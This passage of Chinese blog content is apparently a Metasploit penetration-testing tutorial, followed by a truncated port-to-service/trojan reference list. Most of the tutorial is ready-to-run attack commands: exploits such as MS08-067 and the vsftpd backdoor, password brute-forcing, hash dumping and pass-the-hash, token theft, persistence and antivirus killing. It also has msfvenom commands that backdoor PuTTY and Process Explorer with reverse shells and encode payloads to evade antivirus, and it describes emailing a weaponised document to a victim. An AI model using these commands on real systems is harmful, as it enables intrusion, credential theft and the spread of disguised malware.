的攻击模块，使用 use 加载。设置 payload 位基于 Windows 的 reverse_tcp，这个模块会从目标主机发起一个反弹连接，连接到 LHOST，可以绕过防火墙或者穿透 NAT 网关。show targets 让我们识别和匹配目标操作系统类型（多数模块会自动识别），指定了系统。 Windows XP SP2 English（AlwaysOn NX）意思时不允许执行，即启用 DEP 保护（默认）。设置 RHOST 指定目标， LHOST LPORT 指定监听的TCP端口（使用常见端口可以帮助绕过防火墙）。show options 确认参数都已经设置正确。exploit 初始化攻击环境，并开始对目标进行攻击尝试，成功会返回一个 reverse tcp 方式的 meterpreter 会话。 此时可以使用 session -l 查看远程运行的 meterpreter 状况。如果同时对多个目标进行了攻击，会同时开启多个会话。sessions -i 1指与ID为 1 的控制会话交互。如果这个会话是一个反向连接命令行 shell，这个命令会把我们带到命令提示符状态下。输入 shell，进入目标系统的交互命令行shell。 攻击 Metasploitable与上面类似 1nmap -sT -A -P0 192.168.67.141 发现 22 个开放端口，主机操作系统为 Debian，运行 vsftpd 2.3.4。 1234567search vsftpduse exploit/unix/ftp/vsftpd_234_backdoorshow payloadsset PAYLOAD cmd/unix/interactshow oprtionssetg RHOST 192.168.67.141exploit 这是命令执行攻击 ，成功率很高，标注了 excellent。使用了一个 bind 的交互式 shell，在目标主机打开了一个端口，连接到目标主机。 全端口攻击载荷：暴力破解目标开放的端口如果攻击的组织内部设置了严格的出站端口过滤，可以使用专用的攻击载荷辅助逐个尝试可用的端口。 以攻击 windows 为例 123456789use windows/smb/ms08_067_netapiset LHOST 192.168.67.136set RHOSTs 192.168.67.140set TARGET 4search portsset PAYLOAD windows/meterpreter/reverse_tcp_allportsexploit -jsessions -l -vsession -i 3 对所有端口进行了尝试，直到发现放行的段偶。 资源文件resource file 指 msfconsole 中包含一些列自动化命令的脚本文件，这是一个可以在 msfconsole中执行的命令列表，列表中的命令顺序执行。资源文件可以简化攻击过程，使用resource命令载入资源文件，或者在OS命令行中使用 -r将资源文件作为 msfconsole 的一个参数 。 创建一个能够显示 metasploit 版本并且载入声音插件的资源文件 123echo version &gt; resource.rcecho load sounds &gt;&gt; resource.rcmsfconsole -r resource.rc 实际环境中可以使用更复杂的资源文件，自动进行攻击，比如自动执行SMB攻击，resource.rc内容如下： 12345use explooit/windows/smb/ms80_067_netapi set RHOST 192.168.67.140set PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.67.136exploit 终端执行 12msfconsoleresource resource.rc 后面可以使用 Karmetasploit 创建复杂的资源文件。 Meterpreter使用 Meterpreter 前需要攻陷系统，来获得一个 meterpreter shell 攻击 Windows攻击 MSSQL这次攻击 MSSQL 服务。 12nmap -sT -A -P0 192.168.67.140nmap -sU 192.168.67.140 -p1434 这里MSSQL使用了默认的1433端口，如果不是，可以用mssql_ping模块查找MSSQL服务端口。使用mssql_login可以尝试对 sa 用户密码进行破解。 1234567891011use auxiliary/scanner/mssql/mssql_pingshow optionssetg RHOSTS 192.168.67.140runuse auxiliary/scanner/mssql/mssql_loginshow optionsset PASS_FILE /usr/share/set/src/fattrack/wordlist.txtset THREADS 10set VERBOSE falseset USERNAME saexploit 上面爆破出了 sa 的密码 password123。 xp_cmdshellxp_cmdshell是MSSQL默认装载的内奸存储程序，可以直接执行操作系统命令。下面使用mssql_payload与xp_cmdshell交互，添加本地管理员，通过可执行文件写入payload。 12345678use exploit/windows/mssql/msql_payloadshow optionsset payload windows/meterpreter/reverse_tcpsetg LHOST 192.168.67.136setg LPORT 443setg RHOSTS 192.168.67.140set PASSWORD password123exploit 成功后就得到了一个 meterpreter 会话 meterpreter 基本命令获得 meterpreter shell 后，可以利用一些基本命令获得更多信息，使用help可以得到帮助。 screenshot ，截屏 sysinfo ，获取系统运行的平台 ps ，获得进程列表 migrate ，迁移到目标进程空间 可以获取键盘记录 1234ps # 看到explorer.exe，进程号为1824migrate 1824 # 迁移到 explorer.exe 的进程空间run post/windows/capture/keylog_recorder # 获取记录^C # 一段时间按后使用 CTRL+C 停止，记录保存 获得用户名和密码Windows 系统存储用户密码哈希值方式一般有 LAN Manager(LM), NTLAN Manager(NTLM), NTLAN Manager v2(NTLMv2)。 使用 Meterpreter 命令获取哈希值12use privrun post/windows/gather/hashdump 开头为aad3b的哈希值是一个空的哈希值。 传递哈希值虽然得到了哈希值，但很难破解复杂的密码。使用哈希值传递技术可以只用哈希值登录。 1234567use windows/smb/psexecset PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.67.136set LPORT 443set RHOSTS 192.168.67.140set SMBPass &lt;hash&gt;exploit 权限提升在目标机器上创建新用户bob，运行生成的 payload.exe 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.67.136 LPORT=443 -f exe -o payload.exe 运行后，使用 msfconsole 管理 shell 12345678910use exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.67.136set LPORT 443exploit...getuidshellC:\\Documents and Settings\\bob\\Desktop&gt;net user bob^Z 在这里，获得了shell，用net user 命令发现 bob 是 User 组的用户，不是管理员，然后使用 CTRL+Z 保留会话（也可以使用background），稍后使用 sessions -l 和 sessions -i &lt;id&gt;能够回到 meterpreter shell。 123use privgetsystemgetuid 使用特权模块，然后尝试获取本地管理员或者 SYSTEM 权限，使用 getuid 查看结果。 令牌假冒使用 ps 命令后，可以看到 cmd.exe ，进程号2780，我们所在域是 metasploit， 域管理员为 administrator。 1steal_token 2780 这时 Meterpreter 是以域管理员来运行的。 有时 ps 不能列出域管理员运行的进程，可以使用incognito列举系统上可以使用的令牌。 123456use incognitolist_tokens -uimpersonate_token METASPLOIT\\\\Administratoradd_user omgcompromised p@55word! -h 192.168.1.210add_group_user &quot;Domain Admins&quot; omgcompromised -h 192.168.1.210# 192.168.1.210 是域控制器的地址 跳板攻击使用 Meterpreter 进行跳板攻击例子中，我们从一个子网攻击一个目标系统，然后通过这个系统建立路由攻击其他及其。首先尝试对 Windows XP 进行攻击，然后以此作为据点，对目标内部网络的一个Ubuntu 系统进行攻击。 假设已经获取了某个服务器的访问权限，需要关注的市如何与目标网络建立连接。使用scripts/meterpreter目录下的 Meterpreter 外部脚本，提供了可以使用的额外脚本。 1234run get_local_subnetsbackgroundroute add 192.168.39.0 255.255.255.0 1route print 首先显示了被控系统上的本地子网，将会话后台运行，在MSF终端中添加路由命令，告知系统将远程网络ID（受控主机的本地子网）通过攻击会话1 路由，然后通过route print显示当前活跃的路由设置。 然后对目标Linux系统进行第二次渗透攻击，使用基于 VSFTPD 的攻击，存在于 Metasploitable 靶机上。 1234567use exploit/unix/ftp/vsftpd_234_backdoorset PAYLOAD cmd/unix/interactset RHOSTS 192.168.39.150ifconfigexploitcat /etc/*releasebackground 通过 ifconfig 显示网络信息，然后与 RHOSTS 和LHOST对比，可以看到 LHOST 指定的是攻击机的IP地址，RHOST是 目标网络子网的地址。如果希望进一步对内网进行跳板扫描，可以使用 scanner/portscan/tcp 模块，可以使用已建立的路由通道。 使用load auto_add_route命令可以自动化添加路由 使用 Meterpreter 脚本通过run &lt;script&gt;可以在 meterpreter 终端中运行扩展脚本。 VNC 123run vncrun screenrun screen_unlock 获得一个 VNC 连接。 迁移进程 攻击系统时，使用迁移进程可以进入稳定的，不会关闭的服务进程中，以便维持稳定的系统控制连接。 1run post/windows/manager/migrate 关闭杀软 1run killav 获取系统密码哈希值 1run hashdump 查看流量 1run packetrecorder -i 1 获取系统信息 1run scraper 控制持久化 注入 meterpreter 代理，确保重启之后 meterpreter 还能运行，如果是反弹连接方式可以指定连接间隔；绑定方式可以设置在指定时间绑定开放端口。渗透完成后如果不移除，任何攻击者都可以获得这个系统的访问权。 123456run persistence -X -i 50 -p 443 -r 192.168.1.107use multi/hadlerset payload windows/meterpreter/reverse_tcpset lport 443set lhost 192.168.1.107exploit 开机自启动 -X，50秒重连一次-i 50，端口443 -p 443，连接的目的IP -r 192.168.1.107，使用use multi/handler监听。 移除 Meterpreter 代理的方式是删除 HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\中的注册表键和C:\\WINDOWS\\TEMP中的 VBS 文件 将命令行 shell 升级为 Meterpreter可以在系统被攻陷时使用session -u将命令行 shell 提升为 Meterpreter。例子中使用MS08-067反弹命令行shell，然后升级为 Meterpreter shell。 12345678910search ms08_067use exploit/windows/smb/ms08_067_netapiset payload windows/shell/reverse_tcpset target 4setg lhost 192.168.6.1136setg lport 8080exploit -z# session ID: 18session -u 18sessions -i 10 通过附加的 Railgun 组件操作 Windows API12irbclient.railgun.user32.MessageBoxA(0,&quot;hello&quot;,&quot;orlde&quot;&quot;MB_OK) 通过 irb获得一个交互式 Ruby shell，允许用 Ruby 语法与 Meterpreter 交互。 msfvenom代替了原来的 msfpayload 和 msfencode，是这两个的结合体。 生成 payload需要两个必要参数，-p和-f -p参数指定特定的payload，可以使用如下命令列出所有可以使用的payload 1msfvenom -l payloads 也支持使用 - 作为值从标准输入中读取自定义 payload 1cat payload_file.bin | msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw -f指定 payload 输出格式，例如 1msfvenom -p windows/meterpreter/bind_tcp -f exe 可以通过以下命令查看支持的格式 1msfvenom --help-formats 典型使用 1msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe 对payload进行编码默认情况下，当使用-b选项时（badchar），编码功能自动启用。其他情况下，必须使用-e选项开启编码功能，例如： 1msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw 使用-l参数可列出可用编码器 1msfvenom -l encoders 有时可以通过-i参数将一个payload多次编码，绕过杀软，但是编码并不是免杀的方案 1msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 避免使用某些字符-b参数使用时，某些字符不会出现在payload中，msfvenom会自动使用何时的编码器编码 payload 1msfvenom -p windows/meterpreter/bind_tcp -b '\\x00' -f raw 提供自定义模板默认情况下，msfvenom 使用保存在msf/data/templates下的模板文件，使用-x参数可以指定自己的模板 1msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe 如果想使用自定义的基于64位操作系统的模板，-f参数中的 exe 需要修改为 exe-only。 -x与-k通常同时使用，这样可以将模板中的payload作为新线程运行，但是只适用于较老的机器。 将msfvenom的输出串联（利用管道重定向）旧的 msfpayload 和 msfencode 经常串联使用，并且可以按照多种编码顺序排列，msfvenom也可以这样使用 123msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \\msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | \\msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe 免杀技术杀软通常通过特征码对文件进行检测，我们可以针对目标创建一个独一无二的 payload。直接攻击时，payload还可以仅在内存中运行，不写入硬盘。 使用 MSF 攻击载荷生成器创建可独立运行的二进制文件这里使用 msfvenom 载入 windows/shell_reverse_tcp 载荷，使用--payload-options查看参数 12msfvenom -p windows/shell_reverse_tcp --payload-optionsmsfvenom -p windows/shell_reverse_tcp LHOST=193.168.67.136 LPORT= 443 -f exe -o payload1.exe 启动监听 123use exploit/multi/handlerset payload windows/shell_reverse_tcpshow options 躲避杀软检测使用 MSF 编码器用msfvenom -h查看帮助，msfvenom -l encoders列出可用的编码器。将生成的原始数据输入编码器并查看新生成的文件。 1msfvenom -p windows/shell_reverse_tcp LHOST 192.168.671.36 LPORT=443 -e x86/shikata_ga_nai -f exe -o payload2.exe 多重编码1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.67.136 LPORT=443 -e x86/shikata_ga_nai -i 10 -f raw |msfvenom -e x86/alpha_upper -a x86 --platform windows -i 5 -f raw | msfvenom -e x86/shikata_ga_nai -a x86 --platform windows -i 10 -f raw | msfvenom -e x86/countdown -a x86 --platform windows -i 10 -f exe -o payload3.exe -i参数表示次数，这里总共执行了不同的35次编码，但是依然无法成功突破杀软检测。 自定义可执行文件模板通常，msfvenom会将攻击载荷嵌入默认的可执行文件模板，位于data/templates/template.exe，这个文件会受到杀软的关注。现在的msfvenom支持使用-x使用任意的 Windows 可执行程序代替默认模板文件，例如将微软Sysinternals中的Process Exploerer最为模板。 12345wget http://download.sysinternals.com/files/ProcessExplorer.zipcd workunzip ../ProcessExplorer.zipcd ..msfvenom -p windows/shell_reverse_tcp LHOST=192.168.67.136 LPORT=8080 -e x86/shikata_ga_nai -x work/procexp.exe -i 5 -f exe -o /var/www/pe_backdoor.exe 隐秘地启动一个攻击载荷被攻击的用户打开刚刚生成的文件时，什么都没有发生，可以引起用户的怀疑。我们可以在启动攻击载荷的同时让宿主程序能够正常运行。 123wget https://the.earth.li/~sgtatham/putty/0.67/x86/putty.exemsfcenom -p windows/shell_reverse_tcp LHOST=192.168.67.136 LPORT=443-e x86/shikata_ga_nai -x putty.exe -k -i 5 -f exe -o /var/www/putty_backdoor.exe 用-k选项处理 putty，会配置攻击载荷在一个独立的线程中启动，这样宿主程序不会受影响，但不是所有可执行程序都支持-k选项。如果没有使用-k选项，最好使用图形界面。否则cmd窗口直到攻击载荷使用完毕才会关闭。 加壳软件加壳能够减小文件大小，而且不影响原有的功能。下面使用 UPX 加壳，尝试进行免杀处理 1upx -5 payload3.exe Metasploit Pro 的动态载荷客户端渗透攻击基于浏览器的渗透针对浏览器的攻击与传统的渗透攻击不同在于 shellcode 触发方式不同。传统渗透攻击中，攻击者的全部目标时获取 RCE 的机会，植入一个 payload。然而在浏览器渗透攻击中，为了能够执行特殊构造的 payload，通常采用堆散射（heap sparying）的漏洞利用技术。 堆是指用于动态分配的进程内存空间，应用程序在运行时按需对这段内村惊醒申请和使用。堆空间的大小取决于计算机的可用内存空间，以及在软件生命周期中已使用的内存空间。在程序的运行过程中，对于攻击者而言，内存的分配地址是位置的，所以不能简单地跳转到某一地址。 空指令（NOP）是不做任何事情，直接执行下一条指令。空指令滑行区（NOP slide）是很多空指令相连组成的一个区域。空指令对应的操作码是 90，通常以\\x90的形式出现在渗透代码中。 堆散射技术是指将空指令滑行区与 shellcode 组合成固定的形式，将它们重复填充到堆中，直到填满一大块内存空间。堆中的内存分配实在程序运行时动态执行的，通常利用浏览器执行 JS 申请大量内存，当程序执行流改变时，程序会随即跳转到某个地方，很可能这个地方已经被空指令滑行区覆盖，可以执行紧随其后的 shellcode。 使用 ollydbg 调试器获得空指令机器码1msfvenom -p windows/shell/bind_tcp LPORT=443 -f c -o shellcode1.c 执行之后会输出两个 shellcode，第二部分是在第一部分的shellcode 打开的端口有请求是，Metasploit 会自动发送的。将生成的第一部分 shellcode 中的/x去掉以便使用 ollydbg 调试，可以在前面加上许多90。 随便打开一个程序，打开 ollydbg，选择 File 中的 Open，指向一个可执行程序。在出现的许多汇编指令中，点击第一条，按住 SHIFT 和左键选中接下来的300条指令。赋值刚才的shellcode，在调试窗口中粘贴，可以看到一些空指令和 shellcode。当第一次输出 bind_tcp 格式的 shellcode 时，可以看到第一阶段结束指令时 ecc3，定位这个以 ecc3结尾的指令块。 在 ecc3 的下一条指令设置断点，回到加入空指令的指令区域顶端，F5，执行到断点前，这时已经打开了端口，可以通过netstat -an查看。在 metasploit 中打开一个多线程监听器，这会向第一阶段打开的端口发送第二段 shellcode，获取控制会话。 对 IE 的极光漏洞进行渗透利用1234567use windows/browser/ms10_002_auroraset payload windows/meterpreter/reverse_tcpshow optionsset srvport 80set lhost 192.168.67.136set lport 443exploit -z 设置完成后，可以使用 Windows XP 虚拟机访问 http://&lt;srvhost&gt;:&lt;srvport&gt;，连接到该网站后，虚拟机稍微有些迟钝，稍后就会得到一个 meterpreter shell。但是用户一旦关闭浏览器就会失去连接。一旦建立连接，应该立刻运行run migrate迁移到新的独立进程内存空间。 1run migrate -f 可以使用高级选项进行自动化，比如想改变反弹式连接每次尝试连接的次数。或者自动迁移到新进程。 123show advancedset ReverseConnectRetries 10set AutoRunScript migrate -f 这是一个基于浏览器的攻击，很可能获得的是用户权限的 shell，使用usee priv和getsystem尝试提权。 文件格式漏洞渗透攻击有的应用程序存在由输入文件格式类型 bug 导致的可利用的安全漏洞，比如 Adobe PDF。下面利用 MS11_006，这时一个利用系统函数CreateSizedDIBSECTION中的栈溢出的漏洞。 12345use exploit/windows/fileformat/ms11_006_createsizeddibsectioninfoset payload windows/meterpreter/reverse_tcpset target 2exploit 发送攻击负载上面生成了 msf.doc，可以通过邮件发送给用户。实际发送这个文档之前，必须在模块中建立一个多线程监听端，可以保证渗透攻击发生时，攻击主机可以收到来自目标主机的连接请求。 12345use multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.67.136set lport 443exploit -j Metasploit 辅助模块辅助模块（auxiliary）主要提供信息搜集的支持，也提供一些后渗透攻击模块。 可以使用show auxiliary列出可用辅助模块。 使用辅助模块比如想攻击一台 web 服务器，可以使用search scanner/http查找可用的 HTTP 扫描器。旧版 IIS 服务器的 WebDAV 功能存在一个可用于远程攻击的漏洞，可以针对目标进行一次扫描。 1234use scanner/http/webdav_scannershow options...run 辅助模块剖析 社会工程学工具包配置","link":"/2019/10/06/metasploit/"},{"title":"port-service","text":"端口与对应服务及常见漏洞 文件共享 端口 说明 漏洞 21，22，60 FTP、TFTP 文件传输 允许匿名的上传、下载、爆破、嗅探 2049 NFS 服务 配置不当 139 SAMBA 服务 爆破、未授权访问、远程代码执行 389 LDAP 目录访问协议 注入、允许匿名访问、弱口令 远程连接 端口 说明 漏洞 22 SSH 爆破、SSH隧道、内网代理转发、文件传输 23 Telnet 爆破、嗅探、弱口令 3389 RDP Shift 后门（Windows Server 2003 以下版本）、爆破 5900 VNC 爆破 5632 PcAnywhere 抓取密码、代码执行 TCP端口（静态端口）TCP 0= ReservedTCP 1=TCP Port Service MultiplexerTCP 2=DeathTCP 5=Remote Job Entry,yoyoTCP 7=EchoTCP 11=SkunTCP 12=BomberTCP 16=SkunTCP 17=SkunTCP 18=消息传输协议，skunTCP 19=SkunTCP 20=FTP Data,AmandaTCP 21=文件传输,Back Construction,Blade Runner,Doly Trojan,Fore,FTP trojan,Invisible FTP,Larva,WebEx,WinCrashTCP 22=远程登录协议TCP 23=远程登录（Telnet),Tiny Telnet Server (= TTS)TCP 25=电子邮件(SMTP),Ajan,Antigen,Email Password Sender,Happy99,Kuang2,ProMailtrojan,Shtrilitz,Stealth,Tapiras,Terminator,WinPC,WinSpy,Haebu CocedaTCP 27=AssasinTCP 28=AmandaTCP 29=MSG ICPTCP 30=Agent 40421TCP 31=Agent 31,Hackers Paradise,Masters Paradise,Agent 40421TCP 37=Time,ADM wormTCP 39=SubSARITCP 41=DeepThroat,ForeplayTCP 42=Host Name ServerTCP 43=WHOISTCP 44=ArcticTCP 48=DRATTCP 49=主机登录协议TCP 50=DRATTCP 51=IMP Logical Address Maintenance,Fuck Lamers BackdoorTCP 52=MuSka52,SkunTCP 53=DNS,Bonk (DOS Exploit)TCP 54=MuSka52TCP 58=DMSetupTCP 59=DMSetupTCP 63=whois++TCP 64=Communications IntegratorTCP 65=TACACS-Database ServiceTCP 66=Oracle SQL*NET,AL-BarekiTCP 67=Bootstrap Protocol ServerTCP 68=Bootstrap Protocol ClientTCP 69=TFTP,W32.Evala.Worm,BackGate Kit,Nimda,Pasana,Storm,Storm worm,Theef,Worm.Cycle.aTCP 70=Gopher服务，ADM wormTCP 79=用户查询（Finger),Firehotcker,ADM wormTCP 80=超文本服务器（Http),Executor,RingZeroTCP 81=Chubo,Worm.Bbeagle.qTCP 82=Netsky-ZTCP 88=Kerberos krb5服务TCP 99=Hidden PortTCP 102=消息传输代理TCP 108=SNA网关访问服务器TCP 109=Pop2TCP 110=电子邮件（Pop3),ProMailTCP 113=Kazimas,Auther IdnetTCP 115=简单文件传输协议TCP 118=SQL Services,Infector 1.4.2TCP 119=新闻组传输协议（Newsgroup(Nntp)),Happy 99TCP 121=JammerKiller,Bo jammerkillahTCP 123=网络时间协议(NTP),Net ControllerTCP 129=Password Generator ProtocolTCP 133=Infector 1.xTCP 135=微软DCE RPC end-point mapper服务TCP 137=微软Netbios Name服务（网上邻居传输文件使用）TCP 138=微软Netbios Name服务（网上邻居传输文件使用）TCP 139=微软Netbios Name服务（用于文件及打印机共享）TCP 142=NetTaxiTCP 143=Internet 邮件访问协议版本 4（IMAP4)TCP 146=FC Infector,InfectorTCP 150=NetBIOS Session ServiceTCP 156=SQL服务器TCP 161=SnmpTCP 162=Snmp-TrapTCP 170=A-TrojanTCP 177=X Display管理控制协议TCP 179=Border网关协议（BGP)TCP 190=网关访问控制协议（GACP)TCP 194=IrcTCP 197=目录定位服务（DLS)TCP 220=Internet 邮件访问协议版本 3（IMAP3)TCP 256=NirvanaTCP 315=The InvasorTCP 371=ClearCase版本管理软件TCP 389=Lightweight Directory Access Protocol (LDAP)TCP 396=Novell Netware over IPTCP 420=BreachTCP 421=TCP WrappersTCP 443=安全服务（HTTPS）TCP 444=Simple Network Paging Protocol(SNPP)TCP 445=Microsoft-DSTCP 455=Fatal ConnectionsTCP 456=Hackers paradise,FuseSparkTCP 458=苹果公司QuickTimeTCP 513=GrloginTCP 514=RPC BackdoorUDP 520=RipTCP 531=Rasmin,Net666TCP 544=kerberos kshellTCP 546=DHCP ClientTCP 547=DHCP ServerTCP 548=Macintosh文件服务TCP 555=Ini-Killer,Phase Zero,Stealth SpyTCP 569=MSNTCP 605=SecretServiceTCP 606=Noknok8TCP 660=DeepThroatTCP 661=Noknok8TCP 666=Attack FTP,Satanz Backdoor,Back Construction,Dark Connection Inside 1.2TCP 667=Noknok7.2TCP 668=Noknok6TCP 669=DP trojanTCP 692=GayOLTCP 707=Welchia,nachiTCP 777=AIM SpyTCP 808=RemoteControl,WinHoleTCP 815=Everyone DarlingTCP 901=Backdoor.DevilTCP 911=Dark ShadowTCP 990=ssl加密TCP 993=IMAPTCP 999=DeepThroatTCP 1000=Der SpaeherTCP 1001=Silencer,WebEx,Der SpaeherTCP 1003=BackDoorTCP 1010=DolyTCP 1011=DolyTCP 1012=DolyTCP 1015=DolyTCP 1016=DolyTCP 1020=VampireTCP 1023=Worm.Sasser.eTCP端口（动态端口）TCP 1024=NetSpy.698(YAI)TCP 1025=NetSpy.698,Unused Windows Services BlockTCP 1026=Unused Windows Services BlockTCP 1027=Unused Windows Services BlockTCP 1028=Unused Windows Services BlockTCP 1029=Unused Windows Services BlockTCP 1030=Unused Windows Services BlockTCP 1033=NetspyTCP 1035=MultidropperTCP 1042=BlaTCP 1045=RasminTCP 1047=GateCrasherTCP 1050=MiniCommandTCP 1059=nimregTCP 1069=Backdoor.TheefServer.202TCP 1070=Voice,Psyber Stream Server,Streaming Audio TrojanTCP 1080=Wingate,Worm.BugBear.B,Worm.Novarg.BTCP 1090=Xtreme,VDOLiveTCP 1092=LoveGateTCP 1095=RatTCP 1097=RatTCP 1098=RatTCP 1099=RatTCP 1110=nfsd-keepaliveTCP 1111=Backdoor.AIMVisionTCP 1155=Network File AccessTCP 1170=Psyber Stream Server,Streaming Audio trojan,VoiceTCP 1200=NoBackOTCP 1201=NoBackOTCP 1207=SoftwarTCP 1212=Nirvana,Visul KillerTCP 1234=UltorsTCP 1243=BackDoor-G,SubSeven,SubSeven ApocalypseTCP 1245=VooDoo DollTCP 1269=Mavericks MatrixTCP 1313=NirvanaTCP 1349=BioNetTCP 1433=Microsoft SQL服务TCP 1441=Remote StormTCP 1492=FTP99CMP(BackOriffice.FTP)TCP 1503=NetMeeting T.120TCP 1509=Psyber Streaming ServerTCP 1600=Shivka-BurkaTCP 1688=Key Management Service(密钥管理服务)TCP 1703=Exloiter 1.1TCP 1720=NetMeeting H.233 call SetupTCP 1723=VPN 网关（PPTP）TCP 1731=NetMeeting音频调用控制TCP 1807=SpySenderTCP 1966=Fake FTP 2000TCP 1976=Custom portTCP 1981=ShockraveTCP 1990=stun-p1 cisco STUN Priority 1 portTCP 1990=stun-p1 cisco STUN Priority 1 portTCP 1991=stun-p2 cisco STUN Priority 2 portTCP 1992=stun-p3 cisco STUN Priority 3 port,ipsendmsg IPsendmsgTCP 1993=snmp-tcp-port cisco SNMP TCP portTCP 1994=stun-port cisco serial tunnel portTCP 1995=perf-port cisco perf portTCP 1996=tr-rsrb-port cisco Remote SRB portTCP 1997=gdp-port cisco Gateway Discovery ProtocolTCP 1998=x25-svc-port cisco X.25 service (XOT)TCP 1999=BackDoor,TransScoutTCP 2000=Der Spaeher,INsane NetworkTCP 2002=W32. Beagle .AX @mmTCP 2001=Transmisson scoutTCP 2002=Transmisson scoutTCP 2003=Transmisson scoutTCP 2004=Transmisson scoutTCP 2005=TTransmisson scoutTCP 2011=cypressTCP 2015=raid-csTCP 2023=Ripper,Pass Ripper,Hack City Ripper ProTCP 2049=NFSTCP 2115=BugsTCP 2121=NirvanaTCP 2140=Deep Throat,The InvasorTCP 2155=NirvanaTCP 2208=RuXTCP 2255=Illusion MailerTCP 2283=HVL Rat5TCP 2300=PC ExplorerTCP 2311=Studio54TCP 2556=Worm.Bbeagle.qTCP 2565=StrikerTCP 2583=WinCrashTCP 2600=Digital RootBeerTCP 2716=Prayer TrojanTCP 2745=Worm.BBeagle.kTCP 2773=Backdoor,SubSevenTCP 2774=SubSeven2.1&amp;2.2TCP 2801=Phineas PhuckerTCP 2989=RatTCP 3024=WinCrash trojanTCP 3127=Worm.NovargTCP 3128=RingZero,Worm.Novarg.BTCP 3129=Masters ParadiseTCP 3150=Deep Throat,The InvasorTCP 3198=Worm.NovargTCP 3210=SchoolBusTCP 3332=Worm.Cycle.aTCP 3333=ProsiakTCP 3389=超级终端（远程桌面）TCP 3456=TerrorTCP 3459=Eclipse 2000TCP 3700=Portal of DoomTCP 3791=EclypseTCP 3801=EclypseTCP 3996=Portal of Doom,RemoteAnythingTCP 4000=腾讯QQ客户端TCP 4060=Portal of Doom,RemoteAnythingTCP 4092=WinCrashTCP 4242=VHMTCP 4267=SubSeven2.1&amp;2.2TCP 4321=BoBoTCP 4444=Prosiak,Swift remoteTCP 4500=W32.HLLW.TufasTCP 4567=File NailTCP 4590=ICQTrojanTCP 4899=Remote Administrator服务器TCP 4950=ICQTrojanTCP 5000=WindowsXP服务器，Blazer 5,Bubbel,Back Door Setup,Sockets de TroieTCP 5001=Back Door Setup,Sockets de TroieTCP 5002=cd00r,ShaftTCP 5011=One of the Last Trojans (OOTLT)TCP 5025=WM Remote KeyLoggerTCP 5031=Firehotcker,Metropolitan,NetMetroTCP 5032=MetropolitanTCP 5190=ICQ QueryTCP 5321=FirehotckerTCP 5333=Backage Trojan Box 3TCP 5343=WCratTCP 5400=Blade Runner,BackConstruction1.2TCP 5401=Blade Runner,Back ConstructionTCP 5402=Blade Runner,Back ConstructionTCP 5471=WinCrashTCP 5512=Illusion MailerTCP 5521=Illusion MailerTCP 5550=Xtcp,INsane NetworkTCP 5554=Worm.SasserTCP 5555=ServeMeTCP 5556=BO FacilTCP 5557=BO FacilTCP 5569=Robo-HackTCP 5598=BackDoor 2.03TCP 5631=PCAnyWhere dataTCP 5632=PCAnyWhereTCP 5637=PC CrasherTCP 5638=PC CrasherTCP 5698=BackDoorTCP 5714=Wincrash3TCP 5741=WinCrash3TCP 5742=WinCrashTCP 5760=Portmap Remote Root Linux ExploitTCP 5880=Y3K RATTCP 5881=Y3K RATTCP 5882=Y3K RATTCP 5888=Y3K RATTCP 5889=Y3K RATTCP 5900=WinVncTCP 6000=Backdoor.ABTCP 6006=Noknok8TCP 6129=Dameware Nt Utilities服务器TCP 6272=SecretServiceTCP 6267=广外女生TCP 6400=Backdoor.AB,The ThingTCP 6500=Devil 1.03TCP 6661=TemanTCP 6666=TCPshell.cTCP 6667=NT Remote Control,Wise 播放器接收端口TCP 6668=Wise Video广播端口TCP 6669=VampyreTCP 6670=DeepThroat,iPhoneTCP 6671=Deep Throat 3.0TCP 6711=SubSevenTCP 6712=SubSeven1.xTCP 6713=SubSevenTCP 6723=MstreamTCP 6767=NT Remote ControlTCP 6771=DeepThroatTCP 6776=BackDoor-G,SubSeven,2000 CracksTCP 6777=Worm.BBeagleTCP 6789=Doly TrojanTCP 6838=MstreamTCP 6883=DeltaSourceTCP 6912=Shit HeepTCP 6939=IndoctrinationTCP 6969=GateCrasher,Priority,IRC 3TCP 6970=RealAudio,GateCrasherTCP 7000=Remote Grab,NetMonitor,SubSeven1.xTCP 7001=Freak88TCP 7201=NetMonitorTCP 7215=BackDoor-G,SubSevenTCP 7001=Freak88,Freak2kTCP 7300=NetMonitorTCP 7301=NetMonitorTCP 7306=NetMonitor,NetSpy 1.0TCP 7307=NetMonitor,ProcSpyTCP 7308=NetMonitor,X SpyTCP 7323=Sygate服务器端TCP 7424=Host ControlTCP 7511=聪明基因TCP 7597=QazTCP 7609=Snid X2TCP 7626=冰河TCP 7777=The ThingTCP 7789=Back Door Setup,ICQKillerTCP 7983=MstreamTCP 8000=腾讯OICQ服务器端，XDMATCP 8010=Wingate,LogfileTCP 8011=WAY2.4TCP 8080=WWW 代理，Ring Zero,Chubo,Worm.Novarg.BTCP 8102=网络神偷TCP8181=W32.Erkez.D@mmTCP 8520=W32.Socay.WormTCP 8594=I-Worm/Bozori.aTCP 8787=BackOfrice 2000TCP 8888=WinvncTCP 8897=Hack Office,ArmageddonTCP 8989=ReconTCP 9000=NetministratorTCP 9325=MstreamTCP 9400=InCommand 1.0TCP 9401=InCommand 1.0TCP 9402=InCommand 1.0TCP 9872=Portal of DoomTCP 9873=Portal of DoomTCP 9874=Portal of DoomTCP 9875=Portal of DoomTCP 9876=Cyber AttackerTCP 9878=TransScoutTCP 9989=Ini-KillerTCP 9898=Worm.Win32.Dabber.aTCP 9999=Prayer TrojanTCP 10067=Portal of DoomTCP 10080=Worm.Novarg.BTCP 10084=SyphillisTCP 